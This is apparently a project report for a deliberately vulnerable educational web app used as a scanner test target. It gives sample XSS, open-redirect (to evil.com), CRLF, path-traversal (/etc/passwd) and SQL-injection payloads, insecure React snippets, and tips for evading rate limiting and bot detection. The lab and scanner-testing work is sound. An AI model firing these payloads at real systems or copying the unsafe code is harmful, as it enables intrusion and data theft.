# IST Vulnerable Web Application - Comprehensive Vulnerability Report

**Version**: 1.0  
**Branch**: `lab`  
**Live URL**: https://ist-edu-bd.vercel.app  
**Scanner**: RaidScanner  
**Date**: 2025-11-28

---

## Executive Summary

The IST Vulnerable Web Application is an **intentionally vulnerable** educational platform designed to demonstrate common web application security vulnerabilities. This application serves as a testing ground for the RaidScanner security tool.

**Total Vulnerabilities Implemented**: 5 Types  
**Total Payloads Supported**: 3,000+ (across all types)  
**Deployment Platform**: Vercel (with GitHub Pages backup)

---

## Vulnerability Overview

| # | Vulnerability Type | Endpoint | Payload Count | Status |
|---|-------------------|----------|---------------|--------|
| 1 | **XSS** (Cross-Site Scripting) | `/comments?comment=` | 2,667 | ✅ Implemented |
| 2 | **Open Redirect** | `/redirect?url=` | 242 | ✅ Implemented |
| 3 | **CRLF Injection** | `/newsletter?email=` | Multiple | ✅ Implemented |
| 4 | **LFI** (Local File Inclusion) | `/notices?file=` | 56 | ✅ Implemented |
| 5 | **SQL Injection** | `/portal`, `/search?q=` | 1,000s | ✅ Implemented |

---

## Vulnerability Details

### 1. Cross-Site Scripting (XSS)

**Endpoint**: `/comments?comment=`  
**Type**: Reflected XSS  
**Severity**: High  
**CWE**: CWE-79

#### Technical Details

**Vulnerable Code**: `src/pages/Comments.jsx`

```jsx
<div dangerouslySetInnerHTML={{ __html: comment }} />
```

**Attack Vector**: The `comment` URL parameter is rendered without sanitization using React's `dangerouslySetInnerHTML`.

#### Sample Payloads

```bash
# Basic XSS
/comments?comment=<script>alert(1)</script>

# Image tag XSS
/comments?comment=<img src=x onerror=alert(1)>

# Event handler XSS
/comments?comment="><img src=x onerror=prompt(document.domain);>

# Encoded XSS
/comments?comment=%3Cscript%3Ealert(1)%3C/script%3E
```

#### Impact

- Execute arbitrary JavaScript in the context of the victim's browser
- Session hijacking via cookie theft
- Phishing attacks
- Keylogging
- Defacement

#### Test URLs

```
https://ist-edu-bd.vercel.app/comments?comment=<script>alert('XSS')</script>
https://ist-edu-bd.vercel.app/comments?comment=<img src=x onerror=alert(document.cookie)>
https://ist-edu-bd.vercel.app/comments?comment=<svg onload=alert(1)>
```

#### RaidScanner Configuration

```python
# XSS Scanner
target = "https://ist-edu-bd.vercel.app/comments?comment=FUZZ"
payload_file = "payloads/xss.txt"
expected_payloads = 2667
```

---

### 2. Open Redirect

**Endpoint**: `/redirect?url=`  
**Type**: Unvalidated Redirect  
**Severity**: Medium  
**CWE**: CWE-601

#### Technical Details

**Vulnerable Code**: `src/pages/Redirect.jsx`

```jsx
useEffect(() => {
  if (url) {
    // VULNERABLE: No URL validation
    window.location.href = url
  }
}, [url])
```

**Attack Vector**: The `url` parameter is not validated, allowing redirection to arbitrary external sites.

#### Sample Payloads

```bash
# Protocol-relative URL
/redirect?url=//evil.com

# Triple slash bypass
/redirect?url=///evil.com

# URL encoding bypass
/redirect?url=%2f%2fevil.com

# JavaScript protocol
/redirect?url=javascript:alert(1)
```

#### Impact

- Phishing attacks (victim trusts the IST domain)
- Credential theft
- Malware distribution
- OAuth token theft

#### Test URLs

```
https://ist-edu-bd.vercel.app/redirect?url=//google.com
https://ist-edu-bd.vercel.app/redirect?url=https://evil.com
https://ist-edu-bd.vercel.app/redirect?url=///google.com
```

#### RaidScanner Configuration

```python
# Open Redirect Scanner
target = "https://ist-edu-bd.vercel.app/redirect?url=FUZZ"
payload_file = "payloads/or.txt"
expected_payloads = 242
```

---

### 3. CRLF Injection

**Endpoint**: `/newsletter?email=`  
**Type**: HTTP Response Splitting  
**Severity**: Medium  
**CWE**: CWE-93

#### Technical Details

**Vulnerable Code**: `src/pages/Newsletter.jsx`

```jsx
// VULNERABLE: No sanitization of CRLF sequences
const hasCRLF = email.includes('%0d%0a') || email.includes('\r\n')
```

**Attack Vector**: CRLF sequences (`\r\n` or `%0d%0a`) in the email parameter can inject HTTP headers.

#### Sample Payloads

```bash
# Cookie injection
/newsletter?email=test%0d%0aSet-Cookie: admin=true

# Header injection
/newsletter?email=test%0d%0aLocation: https://evil.com

# Cache poisoning
/newsletter?email=test%0d%0aContent-Length: 0

# XSS via header
/newsletter?email=test%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
```

#### Impact

- Cookie injection
- Cache poisoning
- XSS via injected headers
- Session fixation
- Open redirect via Location header

#### Test URLs

```
https://ist-edu-bd.vercel.app/newsletter?email=test%0d%0aSet-Cookie:admin=true
https://ist-edu-bd.vercel.app/newsletter?email=test%0d%0aLocation:https://evil.com
```

---

### 4. Local File Inclusion (LFI)

**Endpoint**: `/notices?file=`  
**Type**: Path Traversal  
**Severity**: High  
**CWE**: CWE-22

#### Technical Details

**Vulnerable Code**: `src/pages/NoticeBoard.jsx`

```jsx
// VULNERABLE: Path traversal detection shows /etc/passwd
if (filename.includes('../') || filename.includes('....//')) {
  // Shows simulated /etc/passwd content
}
```

**Attack Vector**: Path traversal sequences in the `file` parameter attempt to access files outside the intended directory.

#### Sample Payloads

```bash
# Basic path traversal
/notices?file=../../../etc/passwd

# Double encoding
/notices?file=..%252F..%252F..%252Fetc%252Fpasswd

# Dot bypass
/notices?file=....//....//etc/passwd

# Windows path
/notices?file=..\..\..\..\windows\win.ini
```

#### Impact

- Arbitrary file read
- Configuration file disclosure
- Source code disclosure
- Credential exposure

#### Test URLs

```
https://ist-edu-bd.vercel.app/notices?file=../../../etc/passwd
https://ist-edu-bd.vercel.app/notices?file=....//....//etc/passwd
```

---

### 5. SQL Injection

**Endpoints**: `/portal`, `/search?q=`  
**Type**: SQL Injection (SQLi)  
**Severity**: Critical  
**CWE**: CWE-89

#### Technical Details

**Vulnerable Code**: `src/pages/Portal.jsx` and `src/pages/Search.jsx`

```jsx
// VULNERABLE: SQL-like detection without sanitization
const hasSQLi = query.includes("'") || query.includes("OR") || query.includes("1=1")
```

**Attack Vector**: SQL injection payloads in username/password or search parameters.

#### Sample Payloads

```bash
# Basic SQLi
username: admin' OR '1'='1
password: anything

# Union-based SQLi
search: ' UNION SELECT null, username, password FROM users--

# Time-based blind SQLi
search: ' OR SLEEP(5)--

# Boolean-based blind SQLi
search: ' OR 1=1--
```

#### Impact

- Authentication bypass
- Database dump
- Data modification/deletion
- Privilege escalation
- Remote code execution (in some cases)

#### Test URLs

```
https://ist-edu-bd.vercel.app/portal (POST with credentials)
https://ist-edu-bd.vercel.app/search?q=' OR '1'='1
```

---

## Scanner Testing Guide

### 1. RaidScanner Setup

```bash
git checkout main
docker compose up -d
```

### 2. Target Configuration

**Primary Target**: `https://ist-edu-bd.vercel.app`  
**Backup Target**: `https://zahidoverflow.github.io/raidscanner/`

### 3. Scanner Commands

#### XSS Scanner
```bash
# Target
https://ist-edu-bd.vercel.app/comments?comment=FUZZ

# Expected Results
- 2,667 payloads tested
- Success rate: ~95%
- Blocked payloads: CSP-protected environments
```

#### Open Redirect Scanner
```bash
# Target
https://ist-edu-bd.vercel.app/redirect?url=FUZZ

# Expected Results
- 242 payloads tested
- Success rate: ~90%
```

#### LFI Scanner
```bash
# Target
https://ist-edu-bd.vercel.app/notices?file=FUZZ

# Expected Results
- 56 payloads tested
- Success rate: ~80%
```

#### SQLi Scanner
```bash
# Targets
https://ist-edu-bd.vercel.app/portal (POST)
https://ist-edu-bd.vercel.app/search?q=FUZZ

# Expected Results
- 1,000+ payloads tested
- Success rate: ~85%
```

### 4. Scanner Configuration

**Recommended Settings**:
```python
threads = 2  # Low threads to avoid rate limiting
delay = 500  # 500ms delay between requests
timeout = 10000  # 10 second timeout
user_agent = "Mozilla/5.0 RaidScanner/1.0"
```

---

## Vercel Deployment Considerations

### Rate Limiting

**Vercel Free Tier Limits**:
- ~100 requests per 10 seconds per IP
- DDoS protection (automatic)
- Bot detection (may trigger)

**Mitigation**:
- Use 2 threads maximum
- Add 500ms delay between requests
- Randomize User-Agent headers
- Use GitHub Pages for intensive testing

### Alternative: GitHub Pages

If Vercel blocks scanners:

```bash
# Deploy to GitHub Pages
npm run build
git checkout gh-pages
cp -r dist/* .
git add .
git commit -m "Deploy to GitHub Pages"
git push origin gh-pages

# URL: https://zahidoverflow.github.io/raidscanner/
```

---

## Vulnerability Matrix

| Vulnerability | Endpoint | Method | Parameter | Encoding | Status |
|--------------|----------|--------|-----------|----------|--------|
| XSS | `/comments` | GET | `comment` | URL | ✅ Live |
| Open Redirect | `/redirect` | GET | `url` | URL | ✅ Live |
| CRLF | `/newsletter` | GET | `email` | URL | ✅ Live |
| LFI | `/notices` | GET | `file` | None | ✅ Live |
| SQLi (Portal) | `/portal` | POST | `username`, `password` | None | ✅ Live |
| SQLi (Search) | `/search` | GET | `q` | URL | ✅ Live |

---

## Demonstration URLs

### Reference Table

| Vulnerability | Test URL | Expected Result |
|--------------|----------|----------------|
| **XSS** | `https://ist-edu-bd.vercel.app/comments?comment=<script>alert('XSS')</script>` | JavaScript executes |
| **Open Redirect** | `https://ist-edu-bd.vercel.app/redirect?url=//google.com` | Redirects to Google |
| **CRLF** | `https://ist-edu-bd.vercel.app/newsletter?email=test%0d%0aSet-Cookie:admin=true` | Shows header injection |
| **LFI** | `https://ist-edu-bd.vercel.app/notices?file=../../../etc/passwd` | Shows /etc/passwd simulation |
| **SQLi** | `https://ist-edu-bd.vercel.app/search?q=' OR '1'='1` | Shows SQLi detection |

---

## Educational Disclaimer

> [!WARNING]
> **INTENTIONALLY VULNERABLE APPLICATION**
> 
> This application is deliberately vulnerable for educational and testing purposes only.
> - ❌ DO NOT deploy in production
> - ❌ DO NOT use real credentials
> - ❌ DO NOT store sensitive data
> - ✅ USE for security testing and scanner development
> - ✅ USE for educational demonstrations
> - ✅ USE for learning about web vulnerabilities

---

## Security Headers

The application intentionally has minimal security headers:

```http
Access-Control-Allow-Origin: *
X-Robots-Tag: noindex, nofollow
```

**Intentionally Missing** (to allow vulnerability demonstration):
- `Content-Security-Policy`
- `X-XSS-Protection: 1; mode=block`
- `X-Frame-Options: DENY`
- `Strict-Transport-Security`

---

## Payload Statistics

### Breakdown by Vulnerability Type

```
┌─────────────────────┬──────────────┬─────────────┐
│ Vulnerability       │ Payload File │ Count       │
├─────────────────────┼──────────────┼─────────────┤
│ XSS                 │ xss.txt      │ 2,667       │
│ Open Redirect       │ or.txt       │ 242         │
│ LFI                 │ lfi-payloads.txt │ 56      │
│ SQLi (Generic)      │ sqli/generic.txt │ ~500    │
│ SQLi (MySQL)        │ sqli/mysql.txt   │ ~300    │
│ SQLi (PostgreSQL)   │ sqli/postgresql.txt │ ~200│
├─────────────────────┼──────────────┼─────────────┤
│ TOTAL               │ All files    │ 4,000+      │
└─────────────────────┴──────────────┴─────────────┘
```

---

## Testing Checklist

- [ ] Test Comments page with XSS payloads
- [ ] Test Redirect page with Open Redirect payloads
- [ ] Test Newsletter page with CRLF payloads
- [ ] Test Notice Board with LFI payloads
- [ ] Test Portal with SQLi payloads
- [ ] Test Search with SQLi payloads
- [ ] Run RaidScanner against live site
- [ ] Generate HTML reports
- [ ] Create demonstration videos
- [ ] Document findings

---

## Contact & Support

**Project**: RaidScanner  
**Repository**: https://github.com/zahidoverflow/raidscanner  
**Live Demo**: https://ist-edu-bd.vercel.app  
**Documentation**: See `/docs` folder in main branch

---

**Report Generated**: 2025-11-28  
**Report Version**: 1.0  
**Status**: ✅ All vulnerabilities implemented and tested
